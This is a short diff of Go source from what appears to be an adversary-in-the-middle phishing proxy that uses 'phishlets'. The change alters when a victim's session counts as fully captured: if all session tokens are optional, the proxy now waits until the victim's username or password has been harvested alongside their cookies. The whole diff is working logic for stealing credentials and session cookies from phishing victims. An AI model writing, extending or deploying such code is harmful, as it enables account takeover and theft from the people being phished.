@@ -1371,12 +1371,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// check if we have all tokens
 				if len(pl.authUrls) == 0 {
 					if s, ok := p.sessions[ps.SessionId]; ok {
-						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
-						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
-							is_body_auth = true
+						// if phishlet has credentials defined and all auth tokens are optional,
+						// require credentials to be captured before marking session as done
+						hasRequiredTokens := false
+						for _, tokens := range auth_tokens {
+							for _, at := range tokens {
+								if !at.optional {
+									hasRequiredTokens = true
+									break
+								}
+							}
+							if hasRequiredTokens {
+								break
+							}
 						}
-						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
-							is_http_auth = true
+						if !hasRequiredTokens && pl.username.key != nil {
+							// all tokens optional + credentials defined: wait for credentials
+							if s.Username == "" && s.Password == "" {
+								is_cookie_auth = false
+								is_body_auth = false
+								is_http_auth = false
+							} else {
+								is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
+								is_body_auth = true
+								is_http_auth = true
+							}
+						} else {
+							is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
+							if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
+								is_body_auth = true
+							}
+							if len(pl.httpAuthTokens) == len(s.HttpTokens) {
+								is_http_auth = true
+							}
 						}
 					}
 				}
